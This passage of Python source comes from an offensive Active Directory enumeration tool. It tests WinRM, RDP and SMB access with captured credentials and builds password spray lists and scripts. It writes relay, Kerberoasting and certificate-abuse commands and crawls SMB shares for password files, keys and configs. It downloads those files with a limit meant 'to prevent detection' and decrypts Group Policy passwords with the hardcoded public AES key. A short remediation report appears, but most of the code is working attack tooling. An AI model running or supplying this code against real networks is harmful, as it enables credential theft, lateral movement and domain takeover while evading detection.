                hash_file = os.path.join(self.output_dir, 'loot', 'asreproast.txt')
                with open(hash_file, 'w') as f:
                    f.write(stdout)
                print(f"{Fore.GREEN}[+] Hashes saved to {hash_file}{Style.RESET_ALL}")

    def check_access(self):
        """Check what access we have"""
        if not self.username:
            return
        
        print(f"\n{Fore.YELLOW}[*] Testing access levels...{Style.RESET_ALL}")
        
        # WinRM access
        if 5985 in self.results['services']:
            cmd = ['crackmapexec', 'winrm', self.target, '-u', self.username, '-p', self.password]
            stdout, _, returncode = self.run_command(cmd, timeout=15)
            
            if returncode == 0 and "[+]" in stdout and "Pwn3d" in stdout:
                print(f"{Fore.RED}[!] WinRM Admin access confirmed!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    evil-winrm -i {self.target} -u '{self.username}' -p '{self.password}'{Style.RESET_ALL}")
                self.results['attack_paths'].append("WinRM shell access (Admin)")
            elif returncode == 0 and "[+]" in stdout:
                print(f"{Fore.GREEN}[+] WinRM access confirmed{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    evil-winrm -i {self.target} -u '{self.username}' -p '{self.password}'{Style.RESET_ALL}")
                self.results['attack_paths'].append("WinRM shell access")
        
        # RDP access
        if 3389 in self.results['services']:
            cmd = ['crackmapexec', 'rdp', self.target, '-u', self.username, '-p', self.password]
            stdout, _, returncode = self.run_command(cmd, timeout=15)
            
            if returncode == 0 and "[+]" in stdout:
                print(f"{Fore.GREEN}[+] RDP access confirmed{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    xfreerdp /v:{self.target} /u:'{self.username}' /p:'{self.password}'{Style.RESET_ALL}")
                self.results['attack_paths'].append("RDP access")
        
        # Check for admin via SMB
        if 445 in self.results['services']:
            cmd = ['crackmapexec', 'smb', self.target, '-u', self.username, '-p', self.password]
            stdout, _, _ = self.run_command(cmd, timeout=15)
            
            if "Pwn3d" in stdout:
                print(f"{Fore.RED}[!] Local Admin access via SMB!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    impacket-psexec '{self.username}:{self.password}@{self.target}'{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    impacket-secretsdump '{self.username}:{self.password}@{self.target}'{Style.RESET_ALL}")
                self.results['attack_paths'].append("Local Admin - PSExec/SecretsDump")

    def generate_spray_list(self, users_file):
        """Generate password spray list"""
        passwords = [
            'Password1', 'Password123', 'Welcome1', 'Welcome123',
            'Summer2024', 'Winter2024', 'Spring2024', 'Fall2024',
            'Password1!', 'Welcome1!', f'{self.domain}123' if self.domain else 'Company123',
            'P@ssw0rd', 'Passw0rd!', 'Admin123', 'admin'
        ]
        
        pass_file = os.path.join(self.output_dir, 'passwords.txt')
        with open(pass_file, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        spray_script = f"""#!/bin/bash
# Password spray script
echo "[*] Password spraying against {self.target}"
echo "[*] Users: {users_file}"
echo "[*] Passwords: {pass_file}"
echo ""
echo "Run: crackmapexec smb {self.target} -u {users_file} -p {pass_file} --continue-on-success"
echo "Or:  kerbrute passwordspray -d {self.domain or 'DOMAIN'} {users_file} Password1"
"""
        
        script_file = os.path.join(self.output_dir, 'spray.sh')
        with open(script_file, 'w') as f:
            f.write(spray_script)
        os.chmod(script_file, 0o755)

    def bloodhound_collection(self):
        """BloodHound collection"""
        if not self.username or not self.domain:
            return
        
        if not self.deep:
            return
        
        print(f"\n{Fore.YELLOW}[*] BloodHound collection...{Style.RESET_ALL}")
        
        cmd = ['bloodhound-python', '-d', self.domain, '-u', self.username, '-p', self.password, '-c', 'all', '-ns', self.target, '--zip']
        stdout, stderr, returncode = self.run_command(cmd, timeout=120)
        
        if returncode == 0:
            # Move zip files to output directory
            subprocess.run(f"mv *.zip {self.output_dir}/loot/", shell=True)
            print(f"{Fore.GREEN}[+] BloodHound data collected in {self.output_dir}/loot/{Style.RESET_ALL}")
            self.results['attack_paths'].append("BloodHound analysis available")

    def save_results(self):
        """Save all results"""
        report_file = os.path.join(self.output_dir, 'report.json')
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=4, default=str)
        
        # Save attack paths
        if self.results['attack_paths']:
            attack_file = os.path.join(self.output_dir, 'attack_paths.txt')
            with open(attack_file, 'w') as f:
                f.write("ATTACK PATHS IDENTIFIED\n")
                f.write("=" * 50 + "\n\n")
                for path in self.results['attack_paths']:
                    f.write(f"→ {path}\n")

    def generate_enhanced_report(self):
        """Generate comprehensive v3.0 report with new findings"""
        self.generate_report()  # Call original report
        
        # Generate enhanced reports
        self.generate_executive_summary()
        self.generate_attack_commands()
        self.generate_remediation_report()
    
    def generate_executive_summary(self):
        """Generate executive summary report"""
        summary = {
            'scan_info': {
                'target': self.target,
                'domain': self.results['domain_info'].get('domain', 'Unknown'),
                'timestamp': self.results['timestamp'],
                'version': '3.0'
            },
            'findings_summary': {
                'total_vulnerabilities': len(self.results['vulnerabilities']),
                'high_risk_findings': 0,
                'medium_risk_findings': 0,
                'delegation_issues': len(self.results['delegation']),
                'adcs_vulnerabilities': len([k for k in self.results['adcs'].keys() if k.startswith('ESC')]),
                'coercion_vectors': len(self.results['coercion_vectors']),
                'privilege_escalation_paths': len(self.results['privilege_escalation'])
            }
        }
        
        # Calculate risk levels
        high_risk_indicators = ['MS17-010', 'SMB Signing disabled', 'No lockout policy', 'ADCS ESC']
        for vuln in self.results['vulnerabilities']:
            if any(indicator in vuln for indicator in high_risk_indicators):
                summary['findings_summary']['high_risk_findings'] += 1
            else:
                summary['findings_summary']['medium_risk_findings'] += 1
        
        # Save executive summary
        with open(f"{self.output_dir}/executive_summary.json", 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Executive summary saved to executive_summary.json{Style.RESET_ALL}")
    
    def generate_attack_commands(self):
        """Generate ready-to-use attack commands"""
        commands = {
            'linux_commands': [],
            'windows_commands': [],
            'metasploit_commands': []
        }
        
        # SMB attacks
        if any('SMB Signing disabled' in vuln for vuln in self.results['vulnerabilities']):
            commands['linux_commands'].append("# SMB Relay Attack")
            commands['linux_commands'].append(f"ntlmrelayx.py -t {self.target} -smb2support")
        
        # Kerberoasting
        if self.results['kerberos'].get('kerberoastable', 0) > 0:
            domain = self.domain or self.target
            commands['linux_commands'].append("# Kerberoasting")
            commands['linux_commands'].append(f"impacket-GetUserSPNs {shlex.quote(f'{domain}/{self.username}:{self.password}')} -dc-ip {self.target} -request")
        
        # ADCS attacks
        for esc in self.results['adcs']:
            if esc.startswith('ESC') and self.results['adcs'][esc]:
                commands['linux_commands'].append(f"# ADCS {esc} Attack")
                commands['linux_commands'].append(f"certipy req -u {shlex.quote(f'{self.username}@{self.domain}')} -p {shlex.quote(self.password)} -target {self.target}")
        
        # Save commands
        for cmd_type, cmd_list in commands.items():
            if cmd_list:
                filename = f"{self.output_dir}/commands/{cmd_type}.txt"
                with open(filename, 'w') as f:
                    f.write('\n'.join(cmd_list))
        
        print(f"{Fore.GREEN}[+] Attack commands saved to commands/ directory{Style.RESET_ALL}")
    
    def generate_remediation_report(self):
        """Generate remediation recommendations"""
        remediation = {
            'critical_issues': [],
            'high_priority': [],
            'medium_priority': [],
            'recommendations': []
        }
        
        # Analyze vulnerabilities and provide remediation
        for vuln in self.results['vulnerabilities']:
            if 'MS17-010' in vuln:
                remediation['critical_issues'].append({
                    'issue': vuln,
                    'remediation': 'Apply Microsoft Security Bulletin MS17-010 patches immediately',
                    'cve': 'CVE-2017-0144'
                })
            elif 'SMB Signing disabled' in vuln:
                remediation['high_priority'].append({
                    'issue': vuln,
                    'remediation': 'Enable SMB signing on all domain controllers and servers'
                })
            elif 'No lockout policy' in vuln:
                remediation['high_priority'].append({
                    'issue': vuln,
                    'remediation': 'Implement account lockout policy (recommend 5 failed attempts)'
                })
        
        # ADCS recommendations
        for esc in self.results['adcs']:
            if esc.startswith('ESC') and self.results['adcs'][esc]:
                remediation['high_priority'].append({
                    'issue': f'ADCS {esc} vulnerability',
                    'remediation': f'Review and harden certificate template configurations for {esc}'
                })
        
        # Save remediation report
        with open(f"{self.output_dir}/remediation_report.json", 'w') as f:
            json.dump(remediation, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Remediation report saved to remediation_report.json{Style.RESET_ALL}")

    def generate_report(self):
        """Generate comprehensive report"""
        print(f"\n{Fore.CYAN}{'=' * 70}")
        print(f"                     ENUMERATION REPORT")
        print(f"{'=' * 70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}[TARGET INFORMATION]{Style.RESET_ALL}")
        print(f"  Target:   {self.target}")
        print(f"  Domain:   {self.results['domain_info'].get('domain', 'Unknown')}")
        print(f"  Hostname: {self.results['domain_info'].get('hostname', 'Unknown')}")
        print(f"  Services: {len(self.results['services'])}")
        
        if self.results['services']:
            print(f"\n{Fore.YELLOW}[SERVICES]{Style.RESET_ALL}")
            for port, service in sorted(self.results['services'].items()):
                print(f"  {port:5} - {service}")
        
        if self.results['shares']:
            print(f"\n{Fore.YELLOW}[SMB SHARES]{Style.RESET_ALL}")
            for share in self.results['shares']:
                color = Fore.RED if 'WRITE' in share['permissions'] else Fore.GREEN
                print(f"  {color}{share['name']:20} {share['permissions']}{Style.RESET_ALL}")
        
        if self.results['users']:
            print(f"\n{Fore.YELLOW}[USERS]{Style.RESET_ALL}")
            print(f"  Found: {len(self.results['users'])} users")
            for user in self.results['users'][:10]:
                print(f"  • {user['username']}")
            if len(self.results['users']) > 10:
                print(f"  ... and {len(self.results['users']) - 10} more")
        
        if self.results['vulnerabilities']:
            print(f"\n{Fore.RED}[VULNERABILITIES]{Style.RESET_ALL}")
            for vuln in self.results['vulnerabilities']:
                print(f"  ! {vuln}")
        
        if self.results['attack_paths']:
            print(f"\n{Fore.RED}[ATTACK PATHS]{Style.RESET_ALL}")
            for path in self.results['attack_paths']:
                print(f"  → {path}")
        
        print(f"\n{Fore.GREEN}[OUTPUT FILES]{Style.RESET_ALL}")
        print(f"  Directory: {self.output_dir}/")
        if os.path.exists(f"{self.output_dir}/users.txt"):
            print(f"  • users.txt - User list for spraying")
        if os.path.exists(f"{self.output_dir}/passwords.txt"):
            print(f"  • passwords.txt - Common passwords")
        if os.path.exists(f"{self.output_dir}/spray.sh"):
            print(f"  • spray.sh - Password spray script")
        if os.path.exists(f"{self.output_dir}/loot/"):
            loot_files = os.listdir(f"{self.output_dir}/loot/")
            if loot_files:
                print(f"  • loot/ - {len(loot_files)} files")
        
        print(f"\n{Fore.GREEN}[+] Enumeration complete!{Style.RESET_ALL}")

    def run(self):
        """Main execution"""
        self.banner()
        
        print(f"{Fore.CYAN}[*] Target: {self.target}{Style.RESET_ALL}")
        if self.username:
            print(f"{Fore.CYAN}[*] Username: {self.username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Output: {self.output_dir}{Style.RESET_ALL}")
        if self.deep:
            print(f"{Fore.CYAN}[*] Deep enumeration enabled{Style.RESET_ALL}")
        
        # Basic checks
        if not self.test_connectivity():
            return
        
        if not self.scan_services():
            print(f"{Fore.RED}[!] No services found{Style.RESET_ALL}")
            return
        
        # Core enumeration
        self.enum_smb_info()
        self.enum_shares()
        self.enum_users()
        
        if self.username:
            self.enum_groups()
            self.check_password_policy()
            self.check_kerberos()
            self.check_access()
        
        # Vulnerability checks
        self.check_vulnerabilities()
        
        # Deep enumeration
        if self.deep and self.username:
            self.bloodhound_collection()
        
        # Enhanced enumeration modules (v3.0)
        if self.username and ('all' in self.modules or 'smb' in self.modules):
            print(f"\n{Fore.CYAN}[*] Running Advanced SMB Module...{Style.RESET_ALL}")
            if self.results['shares']:
                for share in self.results['shares'][:3]:  # Limit to first 3 shares
                    if 'READ' in share.get('permissions', ''):
                        self.smb_advanced.enum_smb_recursive(share['name'])
            self.smb_advanced.extract_gpp_passwords()
        
        if self.username and ('all' in self.modules or 'ldap' in self.modules):
            if self.domain and self.results['domain_info'].get('is_domain_joined', False):
                print(f"\n{Fore.CYAN}[*] Running LDAP Advanced Module...{Style.RESET_ALL}")
                self.ldap_advanced.enum_delegation()
                self.ldap_advanced.enum_acls()
                self.ldap_advanced.enum_laps()
            else:
                print(f"\n{Fore.YELLOW}[*] Skipping LDAP enumeration - target is standalone (not domain-joined){Style.RESET_ALL}")
        
        if self.username and ('all' in self.modules or 'kerberos' in self.modules):
            if self.domain and self.results['domain_info'].get('is_domain_joined', False):
                print(f"\n{Fore.CYAN}[*] Running Advanced Kerberos Module...{Style.RESET_ALL}")
                self.kerberos_advanced.targeted_kerberoast()
                self.kerberos_advanced.asreproast_enhanced()
                self.kerberos_advanced.delegation_abuse()
            else:
                print(f"\n{Fore.YELLOW}[*] Skipping Kerberos enumeration - target is standalone (not domain-joined){Style.RESET_ALL}")
        
        if self.username and ('all' in self.modules or 'adcs' in self.modules):
            print(f"\n{Fore.CYAN}[*] Running ADCS Enumeration Module...{Style.RESET_ALL}")
            self.adcs_enum.enum_cert_templates()
            self.adcs_enum.enum_ca_config()
        
        if self.username and ('all' in self.modules or 'coercion' in self.modules):
            print(f"\n{Fore.CYAN}[*] Running Coercion Enumeration Module...{Style.RESET_ALL}")
            self.coercion_enum.enum_coercion_methods()
            self.coercion_enum.check_signing_requirements()
        
        if self.username and ('all' in self.modules or 'privesc' in self.modules):
            print(f"\n{Fore.CYAN}[*] Running Privilege Escalation Module...{Style.RESET_ALL}")
            self.privesc_enum.enum_machine_quota()
            self.privesc_enum.enum_gpo_abuse()
        
        # Test credential reuse
        if self.username:
            self.credential_mgr.test_credential_reuse()
        
        # Save and report
        self.save_results()
        self.generate_enhanced_report()


class SMBAdvancedEnum:
    """Deep SMB enumeration with file analysis"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
        
    def enum_smb_recursive(self, share_name, max_depth=3):
        """Recursively enumerate all files in readable shares"""
        if not self.parent.username:
            return
        
        print(f"\n{Fore.YELLOW}[*] Deep SMB enumeration on {share_name} (depth: {max_depth}){Style.RESET_ALL}")
        
        # High-value file patterns prioritized by security impact
        critical_patterns = {
            'passwords': ['*password*', '*pwd*', '*pass*', '*secret*'],
            'configs': ['web.config', 'app.config', 'appsettings.json', 'connectionstrings.config'],
            'certificates': ['*.pfx', '*.p12', '*.key', '*.pem', '*.crt'],
            'databases': ['*.kdbx', '*.kdb', '*.sqlite', '*.db'],
            'scripts': ['*.ps1', '*.bat', '*.vbs', '*.cmd'],
            'backups': ['*.bak', '*.backup', '*.old', '*.tmp'],
            'installers': ['*.msi', '*.exe', 'setup.*', 'install.*'],
            'documents': ['*.doc*', '*.xls*', '*.pdf'],
            'system': ['unattend.xml', 'sysprep.inf', 'answer.xml']
        }
        
        findings_summary = {}
        
        # Search each pattern category
        for category, patterns in critical_patterns.items():
            category_files = []
            
            for pattern in patterns:
                # Use smbmap for file discovery
                cmd = f"smbmap -H {self.parent.target} -u {shlex.quote(self.parent.username)} -p {shlex.quote(self.parent.password)} -r {shlex.quote(share_name)} --depth {max_depth} -A {shlex.quote(pattern)}"
                stdout, _, returncode = self.parent.run_command(cmd, timeout=30)
                
                if returncode == 0 and stdout:
                    # Parse smbmap output more carefully
                    for line in stdout.split('\n'):
                        if line.strip() and not line.startswith('[') and not 'dr-' in line:
                            # Extract file info: permissions, size, path
                            if '\t' in line:
                                parts = line.split('\t')
                                if len(parts) >= 3:
                                    perms = parts[0].strip()
                                    size = parts[1].strip()
                                    filepath = parts[2].strip()
                                    
                                    if filepath and not filepath.endswith('/'):
                                        file_info = {
                                            'share': share_name,
                                            'path': filepath,
                                            'permissions': perms,
                                            'size': size,
                                            'category': category,
                                            'risk': self._assess_file_risk(filepath, category)
                                        }
                                        category_files.append(file_info)
            
            if category_files:
                findings_summary[category] = len(category_files)
                self.results['sensitive_files'].extend(category_files)
                
                # Highlight critical findings
                high_risk_files = [f for f in category_files if f['risk'] == 'high']
                if high_risk_files:
                    print(f"{Fore.RED}[!] {len(high_risk_files)} HIGH-RISK {category} files in {share_name}{Style.RESET_ALL}")
                    for file_info in high_risk_files[:3]:  # Show first 3
                        print(f"    {file_info['path']} ({file_info['size']})")
                else:
                    print(f"{Fore.GREEN}[+] {len(category_files)} {category} files in {share_name}{Style.RESET_ALL}")
        
        # Download critical files for analysis
        if findings_summary:
            self._download_critical_files(share_name, [f for files in self.results['sensitive_files'] 
                                                      if f.get('share') == share_name and f.get('risk') == 'high'])
    
    def _assess_file_risk(self, filepath, category):
        """Assess security risk of discovered file"""
        filepath_lower = filepath.lower()
        
        # High-risk indicators
        high_risk_patterns = [
            'password', 'secret', 'private', 'confidential',
            'web.config', 'app.config', 'connectionstring',
            '.pfx', '.p12', '.key', 'unattend.xml', '.kdbx'
        ]
        
        if any(pattern in filepath_lower for pattern in high_risk_patterns):
            return 'high'
        elif category in ['configs', 'certificates', 'databases']:
            return 'medium'
        else:
            return 'low'
    
    def _download_critical_files(self, share_name, critical_files):
        """Download high-risk files for analysis"""
        if not critical_files:
            return
        
        download_dir = f"{self.parent.output_dir}/loot/sensitive_files/{share_name}"
        Path(download_dir).mkdir(parents=True, exist_ok=True)
        
        print(f"{Fore.YELLOW}[*] Downloading {len(critical_files)} critical files...{Style.RESET_ALL}")
        
        for file_info in critical_files[:5]:  # Limit downloads to prevent detection
            try:
                safe_filename = file_info['path'].replace('/', '_').replace('\\', '_')
                local_path = f"{download_dir}/{safe_filename}"
                
                # Use smbget for file download
                cmd = f"smbget -q -u '{self.parent.username}%{self.parent.password}' smb://{self.parent.target}/{share_name}/{file_info['path']} -o {local_path}"
                stdout, stderr, returncode = self.parent.run_command(cmd, timeout=30)
                
                if returncode == 0 and os.path.exists(local_path):
                    print(f"{Fore.GREEN}[+] Downloaded: {file_info['path']}{Style.RESET_ALL}")
                    
                    # Analyze downloaded file
                    self._analyze_downloaded_file(local_path, file_info)
                    
            except Exception as e:
                if self.parent.verbose:
                    print(f"{Fore.YELLOW}[!] Failed to download {file_info['path']}: {e}{Style.RESET_ALL}")
    
    def _analyze_downloaded_file(self, local_path, file_info):
        """Analyze downloaded file for credentials and sensitive data"""
        try:
            file_ext = os.path.splitext(local_path)[1].lower()
            
            if file_ext in ['.xml', '.config', '.txt', '.ini', '.conf']:
                self._parse_text_file(local_path, file_info)
            elif file_ext in ['.ps1', '.bat', '.vbs', '.cmd']:
                self._parse_script_file(local_path, file_info)
                
        except Exception as e:
            if self.parent.verbose:
                print(f"{Fore.YELLOW}[!] Error analyzing {local_path}: {e}{Style.RESET_ALL}")
    
    def _parse_text_file(self, file_path, file_info):
        """Parse text files for credentials and sensitive information"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Look for credential patterns
            credential_patterns = {
                'passwords': [
                    r'password\s*[=:]\s*["\']?([^"\';\s<>]+)',
                    r'pwd\s*[=:]\s*["\']?([^"\';\s<>]+)',
                    r'secret\s*[=:]\s*["\']?([^"\';\s<>]+)',
                ],
                'connection_strings': [
                    r'connectionstring["\']?\s*[=:]\s*["\']?([^"\';<>]+)',
                    r'server\s*=\s*([^;]+).*password\s*=\s*([^;]+)',
                ],
                'api_keys': [
                    r'api[_-]?key\s*[=:]\s*["\']?([a-zA-Z0-9_-]{20,})',
                    r'token\s*[=:]\s*["\']?([a-zA-Z0-9_-]{20,})',
                ]
            }
            
            findings = []
            for category, patterns in credential_patterns.items():
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            match = ' | '.join(match)
                        
                        if len(match.strip()) > 3 and not match.isdigit():
                            findings.append({
                                'type': category,
                                'value': match.strip(),
                                'file': file_info['path'],
                                'share': file_info['share']
                            })
            
            if findings:
                print(f"{Fore.RED}[!] Credentials found in {file_info['path']}:{Style.RESET_ALL}")
                for finding in findings[:3]:  # Show first 3
                    print(f"    {finding['type']}: {finding['value'][:50]}...")
                
                # Store findings
                self.results['credentials'].extend(findings)
                
        except Exception as e:
            if self.parent.verbose:
                print(f"{Fore.YELLOW}[!] Error parsing {file_path}: {e}{Style.RESET_ALL}")
    
    def _parse_script_file(self, file_path, file_info):
        """Parse script files for hardcoded credentials"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Script-specific credential patterns
            script_patterns = [
                r'\$\w*password\w*\s*=\s*["\']([^"\']+)["\']',  # PowerShell
                r'set\s+\w*password\w*=([^\s&]+)',              # Batch
                r'password\s*=\s*["\']([^"\']+)["\']',          # General
            ]
            
            findings = []
            for pattern in script_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if len(match.strip()) > 3:
                        findings.append({
                            'type': 'script_password',
                            'value': match.strip(),
                            'file': file_info['path'],
                            'share': file_info['share']
                        })
            
            if findings:
                print(f"{Fore.RED}[!] Script credentials in {file_info['path']}: {len(findings)} found{Style.RESET_ALL}")
                self.results['credentials'].extend(findings)
                
        except Exception as e:
            if self.parent.verbose:
                print(f"{Fore.YELLOW}[!] Error parsing script {file_path}: {e}{Style.RESET_ALL}")
    
    def extract_gpp_passwords(self):
        """Parse Group Policy Preferences for encrypted passwords"""
        if not self.parent.username:
            return
            
        print(f"\n{Fore.YELLOW}[*] Searching for Group Policy Preferences passwords...{Style.RESET_ALL}")
        
        # Check SYSVOL for GPP files
        sysvol_shares = ['SYSVOL', 'sysvol']
        domain_shares = []
        
        # Try to determine domain-specific SYSVOL paths
        if self.parent.domain:
            domain_shares.extend([
                f'SYSVOL/{self.parent.domain}/Policies',
                f'sysvol/{self.parent.domain}/Policies'
            ])
        
        all_shares = sysvol_shares + domain_shares
        
        gpp_files = ['Groups.xml', 'Services.xml', 'Scheduledtasks.xml', 'DataSources.xml', 
                    'Drives.xml', 'Registry.xml', 'Printers.xml', 'Preferences.xml']
        
        gpp_found = False
        
        for share in all_shares:
            # First, check if share is accessible
            cmd = f"smbmap -H {self.parent.target} -u {shlex.quote(self.parent.username)} -p {shlex.quote(self.parent.password)} -r {shlex.quote(share)}"
            stdout, _, returncode = self.parent.run_command(cmd, timeout=15)
            
            if returncode != 0:
                continue
                
            print(f"{Fore.CYAN}[*] Checking {share} for GPP files...{Style.RESET_ALL}")
            
            # Search for GPP files recursively
            for gpp_file in gpp_files:
                cmd = f"smbmap -H {self.parent.target} -u {shlex.quote(self.parent.username)} -p {shlex.quote(self.parent.password)} -r {shlex.quote(share)} --depth 5 -A {shlex.quote(gpp_file)}"
                stdout, _, _ = self.parent.run_command(cmd, timeout=30)
                
                if stdout and gpp_file in stdout:
                    gpp_found = True
                    print(f"{Fore.GREEN}[+] Found {gpp_file} in {share}{Style.RESET_ALL}")
                    
                    # Parse found GPP files
                    self._download_and_parse_gpp_files(share, stdout)
        
        # Alternative approach: search for cpassword directly in any XML file
        if not gpp_found:
            print(f"{Fore.YELLOW}[*] No GPP files found, searching all XML files for cpassword...{Style.RESET_ALL}")
            self._search_xml_for_cpassword()
    
    def _download_and_parse_gpp_files(self, share, smbmap_output):
        """Download and parse specific GPP files found"""
        gpp_dir = f"{self.parent.output_dir}/loot/gpp_files"
        Path(gpp_dir).mkdir(parents=True, exist_ok=True)
        
        # Extract file paths from smbmap output
        for line in smbmap_output.split('\n'):
            if '.xml' in line and '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 3:
                    filepath = parts[2].strip()
                    
                    if filepath and filepath.endswith('.xml'):
                        try:
                            # Download the specific file
                            safe_filename = filepath.replace('/', '_').replace('\\', '_')
                            local_path = f"{gpp_dir}/{safe_filename}"
                            
                            cmd = f"smbget -q -u '{self.parent.username}%{self.parent.password}' smb://{self.parent.target}/{share}/{filepath} -o {local_path}"
                            stdout, _, returncode = self.parent.run_command(cmd, timeout=20)
                            
                            if returncode == 0 and os.path.exists(local_path):
                                print(f"{Fore.GREEN}[+] Downloaded: {filepath}{Style.RESET_ALL}")
                                self._parse_gpp_file(local_path)
                                
                        except Exception as e:
                            if self.parent.verbose:
                                print(f"{Fore.YELLOW}[!] Failed to download {filepath}: {e}{Style.RESET_ALL}")
    
    def _search_xml_for_cpassword(self):
        """Search all accessible XML files for cpassword attribute"""
        # Get list of accessible shares
        shares_to_check = []
        for share_info in self.results.get('shares', []):
            if 'READ' in share_info.get('permissions', ''):
                shares_to_check.append(share_info['name'])
        
        for share in shares_to_check:
            cmd = f"smbmap -H {self.parent.target} -u {shlex.quote(self.parent.username)} -p {shlex.quote(self.parent.password)} -r {shlex.quote(share)} --depth 3 -A '.*\\.xml'"
            stdout, _, _ = self.parent.run_command(cmd, timeout=30)
            
            if stdout:
                # Check each XML file for cpassword
                for line in stdout.split('\n'):
                    if '.xml' in line and '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            filepath = parts[2].strip()
                            if filepath.endswith('.xml'):
                                self._check_xml_for_cpassword(share, filepath)
    
    def _check_xml_for_cpassword(self, share, filepath):
        """Check individual XML file for cpassword without downloading"""
        try:
            # Use smbclient to peek at file content
            cmd = f"smbclient -U '{self.parent.username}%{self.parent.password}' //{self.parent.target}/{share} -c 'more \"{filepath}\"' | head -20"
            stdout, _, returncode = self.parent.run_command(cmd, timeout=15)
            
            if returncode == 0 and 'cpassword' in stdout.lower():
                print(f"{Fore.YELLOW}[!] Potential GPP password in {share}/{filepath}{Style.RESET_ALL}")
                # Download for full analysis
                self._download_and_parse_gpp_files(share, f"{filepath}\t\t{filepath}")
                
        except Exception as e:
            if self.parent.verbose:
                print(f"{Fore.YELLOW}[!] Error checking {filepath}: {e}{Style.RESET_ALL}")
    
    def _parse_gpp_file(self, file_path):
        """Parse individual GPP XML file for passwords"""
        try:
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Look for cpassword attributes
            for elem in root.iter():
                if 'cpassword' in elem.attrib:
                    cpassword = elem.attrib['cpassword']
                    if cpassword:
                        # Decrypt GPP password
                        decrypted = self._decrypt_gpp_password(cpassword)
                        if decrypted:
                            gpp_data = {
                                'file': file_path,
                                'encrypted': cpassword,
                                'decrypted': decrypted,
                                'username': elem.attrib.get('userName', 'Unknown')
                            }
                            self.results['gpp_passwords'].append(gpp_data)
                            print(f"{Fore.RED}[!] GPP Password found: {decrypted} (User: {gpp_data['username']}){Style.RESET_ALL}")
        except Exception as e:
            if self.parent.verbose:
                print(f"{Fore.YELLOW}[!] Error parsing {file_path}: {e}{Style.RESET_ALL}")
    
    def _decrypt_gpp_password(self, cpassword):
        """Decrypt Group Policy Preferences password using AES"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            
            # GPP AES key (publicly known Microsoft key)
            key = base64.b64decode('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
            
            # Decode the encrypted password
            # Add padding if needed for base64 decoding
            cpassword_padded = cpassword + '=' * (4 - len(cpassword) % 4)
            encrypted = base64.b64decode(cpassword_padded)
            
            # AES decrypt
            cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 16)  # IV is all zeros
            decrypted = cipher.decrypt(encrypted)
            
            # Remove padding and decode
            password = unpad(decrypted, 16).decode('utf-16le').rstrip('\x00')
            return password
            
        except ImportError:
            # Fallback if pycryptodome not available
            try:
                # Try using gpp-decrypt if available
                cmd = f"echo '{cpassword}' | gpp-decrypt"
                stdout, _, returncode = self.parent.run_command(cmd, timeout=5)
                if returncode == 0 and stdout.strip():
                    return stdout.strip()
            except:
                pass
            
            # If no decryption available, return indicator
            return f"[ENCRYPTED_GPP_PASSWORD_{cpassword[:8]}]"
            
        except Exception as e:
            if self.parent.verbose:
                print(f"{Fore.YELLOW}[!] GPP decryption failed: {e}{Style.RESET_ALL}")
            return f"[DECRYPT_FAILED_{cpassword[:8]}]"


class LDAPAdvancedEnum:
    """Comprehensive LDAP enumeration"""
    
    def __init__(self, parent):
        self.parent = parent
        self.results = parent.results
    
    def enum_delegation(self):
        """Find delegation vulnerabilities"""
        if not self.parent.username or 389 not in self.parent.results['services']:
            return
        
        # Skip if no domain (standalone system)
        if not self.parent.domain:
            print(f"{Fore.YELLOW}[*] Skipping delegation enumeration - no domain detected{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.YELLOW}[*] Enumerating delegation vulnerabilities...{Style.RESET_ALL}")
        
        domain_dn = f"dc={self.parent.domain.replace('.', ',dc=')}"
        delegation_found = False
        
        # Build proper LDAP bind DN
        bind_dn = f'{self.parent.username}@{self.parent.domain}'
        
        # 1. Unconstrained Delegation (userAccountControl & 0x80000 = TRUSTED_FOR_DELEGATION)
        print(f"{Fore.CYAN}[*] Checking for unconstrained delegation...{Style.RESET_ALL}")
        cmd = f"ldapsearch -x -H ldap://{self.parent.target} -D {shlex.quote(bind_dn)} -w {shlex.quote(self.parent.password)} -b {shlex.quote(domain_dn)} '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName dNSHostName userAccountControl"
        stdout, _, _ = self.parent.run_command(cmd, timeout=30)
        
        if stdout and 'sAMAccountName' in stdout:
            delegation_found = True
            # Parse LDAP output more carefully
            entries = self._parse_ldap_entries(stdout)
            for entry in entries:
                computer = entry.get('sAMAccountName', ['Unknown'])[0]
                hostname = entry.get('dNSHostName', ['Unknown'])[0]
                
                self.results['delegation'].append({
                    'type': 'unconstrained',
                    'target': computer,
                    'hostname': hostname,
                    'risk': 'critical',
                    'attack_vector': 'Force authentication to this host to capture TGTs'
                })
                print(f"{Fore.RED}[!] CRITICAL: Unconstrained delegation on {computer} ({hostname}){Style.RESET_ALL}")
                print(f"    Attack: python3 printerbug.py {self.parent.domain}/{self.parent.username}:{self.parent.password}@{self.parent.target} {hostname}")
        
        # 2. Constrained Delegation (Traditional)
        print(f"{Fore.CYAN}[*] Checking for constrained delegation...{Style.RESET_ALL}")
